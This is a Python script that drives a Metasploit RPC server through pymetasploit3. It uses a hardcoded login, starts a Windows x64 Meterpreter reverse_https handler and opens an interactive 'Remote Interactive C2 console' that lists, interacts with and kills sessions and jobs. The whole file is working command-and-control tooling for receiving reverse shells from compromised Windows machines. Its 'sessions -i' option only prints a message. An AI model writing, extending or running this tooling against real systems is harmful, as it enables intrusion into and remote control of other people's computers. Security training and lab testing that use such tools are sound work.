
from pymetasploit3.msfrpc import MsfRpcClient
from time import sleep

RPC_ADDRESS = '192.168.56.1'
RPC_PORT = '55553'
RPC_USER = 'admin'
RPC_PASS = 'hehehe'

client = MsfRpcClient(username=RPC_USER, password=RPC_PASS, server=RPC_ADDRESS, port=RPC_PORT, ssl=True)

#new console instance
console = client.call('console.create')
console_id = console["id"]

#len of the console list
console_check_1 = len(client.consoles.list)


#read intro console message, close if error:
result = client.call('console.read', [console_id])

if(result["data"]):
    print("[+] Console Spawned Successfully...")
else:
    print("[-] Error Spawning Console... Closing...")
    client.call('core.close')
    exit()


#Check for/Spawn handler
handler_check = False
if any("Exploit: multi/handler" in s for s in client.jobs.list.values()):
    print("[+] Handler Exists...")
    handler_check = True
else:
    print("[-] Handler Does Not Exist...")
    print("[+] Spawning windows/x64/meterpreter/reverse_https handler")
    print("[+] Listening on " + RPC_ADDRESS)

    client.call('console.write', [console_id, "use payload/windows/x64/meterpreter/reverse_https\r\n"])
    client.call('console.write', [console_id, "set LHOST " + RPC_ADDRESS + "\r\n"])
    client.call('console.write', [console_id, "exploit -j\r\n"])

sleep(1)
#Check for handler
if (handler_check):
    pass
elif any("Exploit: multi/handler" in s for s in client.jobs.list.values()):
    print("[+] Handler Spawned...")
else:
    print("[-] Error Spawning Handler... Closing...")
    client.call('core.close')
    exit()


#write to console format:
#
#result = client.call('console.write', [console_id, "show options\r\n"])
#print(result)
#
#result = client.call('console.read', [console_id])
#print(result["data"])
#


#Input loop:
print("\n[+] Remote Interactive C2 console:")
print("[+] Use command \"help\" for more information...")
try:
    while True:
        user_input = input("RPC >> ").lower()
        if user_input == 'help':
            print("""[+] Help Menu:
        -help : Show help menu
        -sessions:
            -no arg: lists sessions
            -i: sessions id to interact with
            -k: session id to kill
            (once interacting enter help for more commands)
        -jobs:
            -no arg: lists jobs
            -k: job id to kill
        -consoles (mainly for debug/resource management):
            -no arg: lists active RPC consoles
            -k: console id to kill (can kill current rpc session)
            -killall: kill all consoles (terminates current rpc session)
        -exit: exits the interactive C2 console
""")

        elif "sessions" in user_input:
            if user_input == 'sessions':
                client.call('console.write', [console_id, "sessions\r\n"])
                result = client.call('console.read', [console_id])
                print(result["data"])

            elif 'sessions -i ' in user_input:
                session_id = user_input.split('sessions -i ')[1]
                print("[+] Interacting with session " + session_id)


            elif 'sessions -k ' in user_input:
                session_id = user_input.split('sessions -k ')[1]
                print("[+] Killing session " + session_id)
                client.call('console.write', [console_id, "sessions -k " + session_id + "\r\n"])
                result = client.call('console.read', [console_id])
                print(result["data"])

            else:
                print("[-] Unknown Args...")
        
        elif "jobs" in user_input:
            if user_input == 'jobs':
                client.call('console.write', [console_id, "jobs\r\n"])
                result = client.call('console.read', [console_id])
                print(result["data"])

            elif 'jobs -k ' in user_input:
                job_id = user_input.split('jobs -k ')[1]
                print("[+] Killing Job " + job_id)
                client.call('console.write', [console_id, "jobs -k " + job_id + "\r\n"])
                result = client.call('console.read', [console_id])
                print(result["data"])

            else:
                print("[-] Unknown Args...")

        elif "consoles" in user_input:
            if user_input == 'consoles':
                for elem in client.call('console.list')["consoles"]:
                    print("[+] Console: ID = " + elem['id'])

            elif 'consoles -k ' in user_input:
                c_id = user_input.split('consoles -k ')[1]
                client.call('console.destroy', [c_id])

                if(c_id == console_id):
                    print("[-] Exiting...")
                    exit()

            elif 'consoles -killall' in user_input:
                for elem in client.call('console.list')["consoles"]:
                    client.call('console.destroy', [elem['id']])
                
                print("[-] Exiting...")
                exit()

            else:
                print("[-] Unknown Args...")


        elif user_input == 'exit':
            print("[-] Exiting...")
            break
except KeyboardInterrupt:
    print("\n[-] Exiting...")



#destroy console, check list length, and exit the connection
#client.consoles.destroy(console_id)
client.call('console.destroy', [console_id])
console_check_2 = len(client.consoles.list)

if((console_check_1 - 1) == console_check_2):
    print("[+] Console Successfully Killed... Closing.")
else:
    print("[-] Error Killing Console, Check RPC Resources!... Closing.")


client.call('core.close')
